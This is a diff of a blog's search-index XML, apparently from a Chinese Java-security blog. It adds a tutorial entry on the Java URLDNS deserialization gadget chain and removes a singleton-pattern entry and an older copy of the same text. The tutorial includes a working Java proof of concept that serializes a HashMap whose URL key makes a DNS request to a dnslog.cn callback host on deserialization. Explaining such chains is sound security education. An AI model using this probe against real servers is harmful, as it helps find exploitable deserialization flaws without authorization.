 <p>这样我们很容易就会想到Map，HashMap实现了<strong>Serializable</strong>接口，重写了<code>readObject()</code>方法。（在类里面重写了<code>readObject()</code>方法，JDK会自动调用重写的<code>readObject()</code>方法，而不调用原生的<code>readObject()</code>）<img src="https://image.sp4rks.xyz/2024/06/image-20240521141902419.png" alt="image-20240521141902419"></p>
 <p><img src="https://image.sp4rks.xyz/2024/06/image-20240521142108326.png" alt="image-20240521142108326"></p>
+]]></content>
+      <categories>
+        <category>JAVA</category>
+      </categories>
+      <tags>
+        <tag>JAVA安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RULDNS链</title>
+    <url>/2024/05/09/JAVA%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/</url>
+    <content><![CDATA[<h2 id="URLDNS链优点"><a href="#URLDNS链优点" class="headerlink" title="URLDNS链优点"></a>URLDNS链优点</h2><ol>
+<li>使⽤Java内置的类构造，对第三⽅库没有依赖</li>
+<li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li>
+</ol>
+<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>ysoserial 中URLDNS链 ， 看这个利用链只涉及两个类<strong>HashMap</strong>和<strong>URL</strong>。</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509090622554.png" alt="image-20240509090622554"></p>
+<h3 id="HashMap类"><a href="#HashMap类" class="headerlink" title="HashMap类"></a>HashMap类</h3><p><strong>HashMap</strong>自己实现了<code>readObject()</code>。</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509093642516.png" alt="image-20240509093642516"></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br></code></pre></td></tr></table></figure>
+
+<p>putVal重新计算了key的hash，跟进<code>hash()</code>（Ctrl+鼠标左键）</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509093734192.png" alt="image-20240509093734192"></p>
+<p>代码意思是如果key为null返回0，如果不为null，则调用key的<code>hashCode()</code>。</p>
+<p>那我们思考，假如有个a类有<code>hashCode()</code>方法，把a类作为hashMap的key，在这里就相当于调用a类的<code>hashCode()</code>，这就是同名函数调用。</p>
+<h3 id="URL类"><a href="#URL类" class="headerlink" title="URL类"></a>URL类</h3><p>承接上文，<strong>URL</strong>类中有<code>hashCode()</code>方法,<code>hashCode()</code>被handler调用，handler 又是 <strong>URLStreamHandler</strong> 的抽象类，我们再去找 <strong>URLStreamHandler</strong> 的 <code>hashCode()</code> 方法。</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509102412486.png" alt="image-20240509102412486"></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> hashCode;<br><br>        hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">return</span> hashCode;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>hashCode()</code>方法传入一个url，<code>getHostAddress(url)</code></p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509103443938.png" alt="image-20240509103443938"></p>
+<p>进入<code>getHostAddress()</code>方法</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509103838469.png" alt="image-20240509103838469"></p>
+<p>这段代码意思是获取给定 URL 对象的主机地址。如果主机地址已经缓存过，则直接返回缓存的地址；否则，尝试解析主机名获取主机地址，并缓存结果。在⽹络上其实就是⼀次 DNS 查询。</p>
+<p><strong>流程</strong></p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// 首先通过HashMap的readObject函数,会调用putVal()函数计算hasHmap的key</span><br><span class="hljs-number">1</span>. HashMap -&gt; <span class="hljs-built_in">readObject</span>() -&gt; <span class="hljs-built_in">putVal</span>() -&gt; <span class="hljs-built_in">hash</span>(key) <br><span class="hljs-comment">//hash(Object key)会对key调用hashCode()</span><br><span class="hljs-number">2</span>. key<span class="hljs-selector-class">.hashCode</span>()<br><span class="hljs-comment">// 如果传入的key 是一个URL对象</span><br><span class="hljs-number">3</span>. key = URL url<br><span class="hljs-comment">// 然后会触发URL对象hashcode()</span><br><span class="hljs-number">4</span>. url<span class="hljs-selector-class">.hashcode</span>()<br><span class="hljs-comment">// 如果hashcode不为-1,就会调用handler的hashcode,并且传入url</span><br><span class="hljs-number">5</span>. url<span class="hljs-selector-class">.handler</span><span class="hljs-selector-class">.hashcode</span>(url)<br><span class="hljs-comment">// 在handler的hashcode里面会调用getHostAddress,参数是url</span><br><span class="hljs-number">6</span>. <span class="hljs-built_in">getHostAddress</span>(url)<br><span class="hljs-comment">// 最后发起一次dns请求</span><br><span class="hljs-number">7</span>. dns请求<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><p>参考上面的流程，我们需要创建一个hashMap，在hashMap的key传入url对象，看<strong>URL</strong>的构造方法，最简单的构造方法直接放入一个url地址就可以</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509145326944.png" alt="image-20240509145326944"></p>
+<p>hashMap不直接直接传参，必须用<code>put()</code>方法，put进去。</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509145753562.png" alt="image-20240509145753562"></p>
+<p>如果一切顺利的话</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// 首先通过HashMap的readObject函数,会调用putVal()函数计算hasHmap的key</span><br><span class="hljs-number">1</span>. HashMap -&gt; <span class="hljs-built_in">readObject</span>() -&gt; <span class="hljs-built_in">putVal</span>() -&gt; <span class="hljs-built_in">hash</span>(key) <br><span class="hljs-comment">//hash(Object key)会对key调用hashCode()</span><br><span class="hljs-number">2</span>. key<span class="hljs-selector-class">.hashCode</span>()<br><span class="hljs-comment">// 如果传入的key 是一个URL对象</span><br><span class="hljs-number">3</span>. key = URL url<br><span class="hljs-comment">// 然后会触发URL对象hashcode()</span><br><span class="hljs-number">4</span>. url<span class="hljs-selector-class">.hashcode</span>()<br><span class="hljs-comment">// 如果hashcode不为-1,就会调用handler的hashcode,并且传入url</span><br><span class="hljs-number">5</span>. url<span class="hljs-selector-class">.handler</span><span class="hljs-selector-class">.hashcode</span>(url)<br><span class="hljs-comment">// 在handler的hashcode里面会调用getHostAddress,参数是url</span><br><span class="hljs-number">6</span>. <span class="hljs-built_in">getHostAddress</span>(url)<br><span class="hljs-comment">// 最后发起一次dns请求</span><br><span class="hljs-number">7</span>. dns请求<br></code></pre></td></tr></table></figure>
+
+<h3 id="初遇难题"><a href="#初遇难题" class="headerlink" title="初遇难题"></a>初遇难题</h3><p>但是我们发现在序列化的时候就已经触发了</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509150138622.png" alt="image-20240509150138622"></p>
+<p>跟进<strong>hashMap</strong>的<code>put()</code>方法，发现在put的时候就已经对key进行一次<code>hash()</code>了，触发了<strong>URL</strong>类的<code>hashCode()</code>方法</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509111302937.png" alt="image-20240509111302937"></p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509152432465.png" alt="image-20240509152432465"></p>
+<p>我们发现，当 <code>hashCode</code> 的值不等于 -1 的时候，函数就会直接 <code>return hashCode</code> 而不执行 <code>hashCode = handler.hashCode(this);</code>。而一开始定义 HashMap 类的时候<code>hashCode</code> 的值为 -1，便是发起了请求。</p>
+<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509152449960.png" alt="image-20240509152449960"></p>
+<h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><p>思路：在put前，使hashCode不等于-1，put后hashCode等于-1</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>        <br>         <span class="hljs-comment">//思路</span><br>        <span class="hljs-comment">//HashMap&lt;URL, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br>        <span class="hljs-comment">//将hashCOde值改为不是-1，put()的时候就不会发起请求</span><br>        <span class="hljs-comment">//URL url = new URL(&quot;http://jhc0ym.dnslog.cn&quot;);</span><br>       <br>        <span class="hljs-comment">//hashMap.put(url, 1);</span><br>        <span class="hljs-comment">//将hashCode值改为-1</span><br>        <br>        <span class="hljs-comment">//Serialization(hashMap);</span><br>        <br>        <span class="hljs-comment">//实现</span><br>        HashMap&lt;URL, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(); <span class="hljs-comment">//新建一个hashMap</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://jhc0ym.dnslog.cn&quot;</span>);  <span class="hljs-comment">//url</span><br>        <br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URL</span>&gt; c = url.getClass();  <span class="hljs-comment">//获取一个Class</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);  <span class="hljs-comment">//获取hashCode字段</span><br>        hashCodefile.setAccessible(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//设置字段访问权限</span><br>        hashCodefile.set(url, <span class="hljs-number">123</span>);	 <span class="hljs-comment">//将hashCode改为123</span><br><br><br>        hashMap.put(url, <span class="hljs-number">1</span>);<br>        hashCodefile.set(url, -<span class="hljs-number">1</span>);  <span class="hljs-comment">//put完后改为-1</span><br><span class="hljs-comment">//        Serialization(hashMap);</span><br>        Deserialization(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Serialization</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123; <span class="hljs-comment">//序列化</span><br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        outputStream.writeObject(obj);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Deserialization</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;  <span class="hljs-comment">//反序列化</span><br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        inputStream.readObject();<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://juejin.cn/post/6844903954774491144#heading-5">为什么hashMap要实现自己的writeObject和readObject方法</a></p>
+<p><a href="https://drun1baby.top/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/#%E5%AE%9E%E6%88%98-%E2%80%94%E2%80%94%E2%80%94%E2%80%94-URLDNS">Java反序列化基础篇-01-反序列化概念与利用</a></p>
+<p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化漏洞专题-基础篇(21&#x2F;09&#x2F;05更新类加载部分)</a></p>
 ]]></content>
       <categories>
         <category>JAVA</category>
@@ -790,96 +850,6 @@
       </tags>
   </entry>
   <entry>
-    <title>创建型-单例模式</title>
-    <url>/2024/05/10/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
-    <content><![CDATA[<h2 id="饿汉式"><a href="#饿汉式" class="headerlink" title="饿汉式"></a>饿汉式</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Singleton</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <span class="hljs-comment">//用于引用全局唯一的单例对象，在一开始就创建好</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;  <span class="hljs-comment">//不允许随便new</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;   <span class="hljs-comment">//获取全局唯一的单例对象</span><br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Singleton</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> Singleton.getInstance();<br>        System.out.println(instance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-
-
-<h2 id="懒汉式"><a href="#懒汉式" class="headerlink" title="懒汉式"></a>懒汉式</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;  <span class="hljs-comment">//在一开始不创建对象</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">//如果实例为空就创建</span><br>            instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>但是这种方法有种缺陷，由于懒汉式在方法中进行初始化，在多线程的环境下，可能会出现问题。</p>
-<h3 id="懒汉式-改进"><a href="#懒汉式-改进" class="headerlink" title="懒汉式-改进"></a>懒汉式-改进</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">synchronized</span> (Singleton.class) &#123;<br>                instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>但是这种效率比较低，只能又一个线程能进入同步块，其他的必须要等待</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> Singleton instance;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">synchronized</span> (Singleton.class) &#123;<br>                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>                    instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <span class="hljs-comment">//双重检查</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>双重检查可以确保在多线程环境下也能保持单例的唯一性，同时尽可能地减少了同步的开销。</p>
-<h3 id="JAVA特有的写法"><a href="#JAVA特有的写法" class="headerlink" title="JAVA特有的写法"></a>JAVA特有的写法</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingletonHolder</span> &#123;  <span class="hljs-comment">//由静态内部类持有单例对象，根据类加载的特性，仅使用Singleton类时，不会对静态内部类进行初始化</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Singleton</span> <span class="hljs-variable">INSTANCE</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123; <span class="hljs-comment">//只有真正使用内部类时，才会进行类初始化</span><br>        <span class="hljs-keyword">return</span> SingletonHolder.INSTANCE;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>在Java中，静态内部类在被使用之前是不会被初始化的，这是由类加载器的工作原理决定的。</p>
-<p>当程序第一次访问静态内部类 <code>SingletonHolder</code> 时，JVM 会加载 <code>SingletonHolder</code> 类。这个加载过程是延迟的，只有在真正需要使用 <code>SingletonHolder</code> 类时才会触发。所以，即使 <code>Singleton</code> 类被加载了，但是不会导致 <code>SingletonHolder</code> 类被加载，也就不会创建单例对象。</p>
-]]></content>
-      <categories>
-        <category>JAVA</category>
-      </categories>
-      <tags>
-        <tag>JAVA设计模式</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RULDNS链</title>
-    <url>/2024/05/09/JAVA%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/</url>
-    <content><![CDATA[<h2 id="URLDNS链优点"><a href="#URLDNS链优点" class="headerlink" title="URLDNS链优点"></a>URLDNS链优点</h2><ol>
-<li>使⽤Java内置的类构造，对第三⽅库没有依赖</li>
-<li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li>
-</ol>
-<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>ysoserial 中URLDNS链 ， 看这个利用链只涉及两个类<strong>HashMap</strong>和<strong>URL</strong>。</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509090622554.png" alt="image-20240509090622554"></p>
-<h3 id="HashMap类"><a href="#HashMap类" class="headerlink" title="HashMap类"></a>HashMap类</h3><p><strong>HashMap</strong>自己实现了<code>readObject()</code>。</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509093642516.png" alt="image-20240509093642516"></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br></code></pre></td></tr></table></figure>
-
-<p>putVal重新计算了key的hash，跟进<code>hash()</code>（Ctrl+鼠标左键）</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509093734192.png" alt="image-20240509093734192"></p>
-<p>代码意思是如果key为null返回0，如果不为null，则调用key的<code>hashCode()</code>。</p>
-<p>那我们思考，假如有个a类有<code>hashCode()</code>方法，把a类作为hashMap的key，在这里就相当于调用a类的<code>hashCode()</code>，这就是同名函数调用。</p>
-<h3 id="URL类"><a href="#URL类" class="headerlink" title="URL类"></a>URL类</h3><p>承接上文，<strong>URL</strong>类中有<code>hashCode()</code>方法,<code>hashCode()</code>被handler调用，handler 又是 <strong>URLStreamHandler</strong> 的抽象类，我们再去找 <strong>URLStreamHandler</strong> 的 <code>hashCode()</code> 方法。</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509102412486.png" alt="image-20240509102412486"></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> hashCode;<br><br>        hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">return</span> hashCode;<br>    &#125;<br></code></pre></td></tr></table></figure>
-
-<p><code>hashCode()</code>方法传入一个url，<code>getHostAddress(url)</code></p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509103443938.png" alt="image-20240509103443938"></p>
-<p>进入<code>getHostAddress()</code>方法</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509103838469.png" alt="image-20240509103838469"></p>
-<p>这段代码意思是获取给定 URL 对象的主机地址。如果主机地址已经缓存过，则直接返回缓存的地址；否则，尝试解析主机名获取主机地址，并缓存结果。在⽹络上其实就是⼀次 DNS 查询。</p>
-<p><strong>流程</strong></p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// 首先通过HashMap的readObject函数,会调用putVal()函数计算hasHmap的key</span><br><span class="hljs-number">1</span>. HashMap -&gt; <span class="hljs-built_in">readObject</span>() -&gt; <span class="hljs-built_in">putVal</span>() -&gt; <span class="hljs-built_in">hash</span>(key) <br><span class="hljs-comment">//hash(Object key)会对key调用hashCode()</span><br><span class="hljs-number">2</span>. key<span class="hljs-selector-class">.hashCode</span>()<br><span class="hljs-comment">// 如果传入的key 是一个URL对象</span><br><span class="hljs-number">3</span>. key = URL url<br><span class="hljs-comment">// 然后会触发URL对象hashcode()</span><br><span class="hljs-number">4</span>. url<span class="hljs-selector-class">.hashcode</span>()<br><span class="hljs-comment">// 如果hashcode不为-1,就会调用handler的hashcode,并且传入url</span><br><span class="hljs-number">5</span>. url<span class="hljs-selector-class">.handler</span><span class="hljs-selector-class">.hashcode</span>(url)<br><span class="hljs-comment">// 在handler的hashcode里面会调用getHostAddress,参数是url</span><br><span class="hljs-number">6</span>. <span class="hljs-built_in">getHostAddress</span>(url)<br><span class="hljs-comment">// 最后发起一次dns请求</span><br><span class="hljs-number">7</span>. dns请求<br></code></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><p>参考上面的流程，我们需要创建一个hashMap，在hashMap的key传入url对象，看<strong>URL</strong>的构造方法，最简单的构造方法直接放入一个url地址就可以</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509145326944.png" alt="image-20240509145326944"></p>
-<p>hashMap不直接直接传参，必须用<code>put()</code>方法，put进去。</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509145753562.png" alt="image-20240509145753562"></p>
-<p>如果一切顺利的话</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// 首先通过HashMap的readObject函数,会调用putVal()函数计算hasHmap的key</span><br><span class="hljs-number">1</span>. HashMap -&gt; <span class="hljs-built_in">readObject</span>() -&gt; <span class="hljs-built_in">putVal</span>() -&gt; <span class="hljs-built_in">hash</span>(key) <br><span class="hljs-comment">//hash(Object key)会对key调用hashCode()</span><br><span class="hljs-number">2</span>. key<span class="hljs-selector-class">.hashCode</span>()<br><span class="hljs-comment">// 如果传入的key 是一个URL对象</span><br><span class="hljs-number">3</span>. key = URL url<br><span class="hljs-comment">// 然后会触发URL对象hashcode()</span><br><span class="hljs-number">4</span>. url<span class="hljs-selector-class">.hashcode</span>()<br><span class="hljs-comment">// 如果hashcode不为-1,就会调用handler的hashcode,并且传入url</span><br><span class="hljs-number">5</span>. url<span class="hljs-selector-class">.handler</span><span class="hljs-selector-class">.hashcode</span>(url)<br><span class="hljs-comment">// 在handler的hashcode里面会调用getHostAddress,参数是url</span><br><span class="hljs-number">6</span>. <span class="hljs-built_in">getHostAddress</span>(url)<br><span class="hljs-comment">// 最后发起一次dns请求</span><br><span class="hljs-number">7</span>. dns请求<br></code></pre></td></tr></table></figure>
-
-<h3 id="初遇难题"><a href="#初遇难题" class="headerlink" title="初遇难题"></a>初遇难题</h3><p>但是我们发现在序列化的时候就已经触发了</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509150138622.png" alt="image-20240509150138622"></p>
-<p>跟进<strong>hashMap</strong>的<code>put()</code>方法，发现在put的时候就已经对key进行一次<code>hash()</code>了，触发了<strong>URL</strong>类的<code>hashCode()</code>方法</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509111302937.png" alt="image-20240509111302937"></p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509152432465.png" alt="image-20240509152432465"></p>
-<p>我们发现，当 <code>hashCode</code> 的值不等于 -1 的时候，函数就会直接 <code>return hashCode</code> 而不执行 <code>hashCode = handler.hashCode(this);</code>。而一开始定义 HashMap 类的时候<code>hashCode</code> 的值为 -1，便是发起了请求。</p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509152449960.png" alt="image-20240509152449960"></p>
-<h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><p>思路：在put前，使hashCode不等于-1，put后hashCode等于-1</p>
